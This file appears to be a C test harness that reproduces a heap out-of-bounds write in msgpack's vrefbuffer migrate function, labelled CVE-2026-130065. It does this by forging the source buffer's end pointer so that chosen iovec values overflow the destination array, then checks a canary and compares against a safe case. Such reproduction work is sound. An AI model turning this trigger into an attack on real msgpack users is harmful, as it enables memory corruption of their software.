/*
 * Direct-call harness for msgpack_vrefbuffer_migrate (CVE-2026-130065).
 *
 * Only the verbatim pinned function (fns-<pin>.inc) is upstream code. This
 * file supplies the pinned struct layouts, a scripted two-buffer setup, and
 * an observation arena. No msgpack build, no network, no consumer.
 */
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define STR1(x) #x
#define STR(x) STR1(x)

struct msgpack_vrefbuffer_chunk {
    struct msgpack_vrefbuffer_chunk* next;
};
typedef struct msgpack_vrefbuffer_chunk msgpack_vrefbuffer_chunk;

/* Upstream c-7.0.2 include/msgpack/vrefbuffer.h: on Linux msgpack_iovec is
 * struct iovec { void* iov_base; size_t iov_len; } -- 16 bytes here. */
typedef struct msgpack_iovec {
    void* iov_base;
    size_t iov_len;
} msgpack_iovec;

typedef struct msgpack_vrefbuffer_inner_buffer {
    size_t free;
    char* ptr;
    struct msgpack_vrefbuffer_chunk* head;
} msgpack_vrefbuffer_inner_buffer;

typedef struct msgpack_vrefbuffer {
    msgpack_iovec* tail;
    msgpack_iovec* end;
    msgpack_iovec* array;
    size_t chunk_size;
    size_t ref_size;
    msgpack_vrefbuffer_inner_buffer inner_buffer;
} msgpack_vrefbuffer;

#include STR(FNS)

#define CHOSEN_BASE ((void*)(uintptr_t)0x4141414141414141ULL)
#define CHOSEN_LEN  ((size_t)0x5a5a5a5a5a5a5a5aULL)
#define NUSEDV 20
#define CAPDST 8
#define CANARY 0xa5
#define ARENA_EXTRA (sizeof(msgpack_iovec) * NUSEDV + 64)

static msgpack_vrefbuffer* mkbuf(size_t cap, size_t used, int arena)
{
    msgpack_vrefbuffer* b = (msgpack_vrefbuffer*)calloc(1, sizeof(*b));
    size_t alloc = cap * sizeof(msgpack_iovec) + (arena ? ARENA_EXTRA : 0);
    msgpack_iovec* arr = (msgpack_iovec*)malloc(alloc);
    struct msgpack_vrefbuffer_chunk* c;

    if (b == NULL || arr == NULL) {
        free(b);
        free(arr);
        exit(2);
    }
    if (arena) {
        memset(arr, CANARY, alloc);
    }
    for (size_t i = 0; i < cap; ++i) {
        arr[i].iov_base = CHOSEN_BASE;
        arr[i].iov_len = CHOSEN_LEN;
    }
    c = (struct msgpack_vrefbuffer_chunk*)malloc(sizeof(*c) + 64);
    if (c == NULL) {
        exit(2);
    }
    c->next = NULL;

    b->array = arr;
    b->end = arr + cap;
    b->tail = arr + used;
    b->chunk_size = 64;
    b->ref_size = 32;
    b->inner_buffer.head = c;
    b->inner_buffer.free = 64;
    b->inner_buffer.ptr = (char*)c + sizeof(*c);
    return b;
}

static void print_chosen(msgpack_vrefbuffer* b, size_t upto)
{
    size_t i;
    for (i = 0; i < upto; ++i) {
        printf("IN[%zu]=%016llx/%016llx\n", i,
               (unsigned long long)(uintptr_t)b->array[i].iov_base,
               (unsigned long long)b->array[i].iov_len);
    }
}

static void run_vuln(int plain)
{
    msgpack_vrefbuffer* src = mkbuf(NUSEDV, NUSEDV, 0);
    msgpack_vrefbuffer* dst = mkbuf(CAPDST, 0, plain);
    unsigned char* p;
    size_t off, tailoff;
    int chosen, intact;
    int rc;

    /* Advisory layout: destination iovec array sits above the source's.
     * Setting the source's end pointer to the destination's array makes the
     * buggy cross-object comparison to->tail+nused < vbuf->end false; the
     * pointer is only compared, never dereferenced. The fixed pin does not
     * read vbuf->end at all, so this is a clean differential. */
    src->end = dst->array;

    printf("CASE=%s NUSED=%d DST_CAP_BEFORE=%d DST_USED_BEFORE=0\n",
           plain ? "vuln-plain" : "vuln-asan", NUSEDV, CAPDST);
    print_chosen(src, 2);
    fflush(stdout);

    rc = msgpack_vrefbuffer_migrate(src, dst);
    printf("RC=%d DST_CAP_AFTER=%d DST_USED_AFTER=%d SRC_USED_AFTER=%d\n",
           rc, (int)(dst->end - dst->array),
           (int)(dst->tail - dst->array),
           (int)(src->tail - src->array));

    if (!plain) {
        return;
    }

    p = (unsigned char*)dst->array;
    off = sizeof(msgpack_iovec) * CAPDST;
    chosen = 0;
    for (size_t i = 0; i < NUSEDV - CAPDST; ++i) {
        msgpack_iovec* v = (msgpack_iovec*)(p + off + sizeof(msgpack_iovec) * i);
        if (v->iov_base == CHOSEN_BASE && v->iov_len == CHOSEN_LEN) {
            ++chosen;
        }
    }
    printf("OOB_FIRST_OFFSET=%zu OOB_CHOSEN_IOVECS=%d OOB_PAST_CAP=%d\n",
           off, chosen, (int)(dst->tail - dst->end));
    {
        msgpack_iovec* first = (msgpack_iovec*)(p + off);
        printf("OOB_FIRST_BASE=%016llx OOB_FIRST_LEN=%016llx\n",
               (unsigned long long)(uintptr_t)first->iov_base,
               (unsigned long long)first->iov_len);
    }

    tailoff = off + sizeof(msgpack_iovec) * (NUSEDV - CAPDST);
    intact = 1;
    for (size_t i = 0; i < 32; ++i) {
        if (p[tailoff + i] != CANARY) {
            intact = 0;
        }
    }
    printf("OOB_TAIL_SENTINEL=%s\n", intact ? "INTACT" : "CORRUPTED");
}

static void run_safe(void)
{
    msgpack_vrefbuffer* src = mkbuf(NUSEDV, 4, 0);
    msgpack_vrefbuffer* dst = mkbuf(CAPDST, 0, 1);
    int rc;

    printf("CASE=safe NUSED=4 DST_CAP_BEFORE=%d\n", CAPDST);
    rc = msgpack_vrefbuffer_migrate(src, dst);
    printf("RC=%d DST_CAP_AFTER=%d DST_USED_AFTER=%d\n", rc,
           (int)(dst->end - dst->array), (int)(dst->tail - dst->array));
    print_chosen(dst, 4);
    printf("INBOUND_CHOSEN=1\n");
}

int main(void)
{
    int plain = 0;
#ifdef PLAIN_MODE
    plain = 1;
#endif
    printf("PIN=%s MODE=%s IOVEC=%zu\n", STR(PIN),
           plain ? "plain" : "asan", sizeof(msgpack_iovec));
#ifdef SAFE_ONLY
    run_safe();
#else
    run_vuln(plain);
    run_safe();
#endif
    fflush(stdout);
    return 0;
}
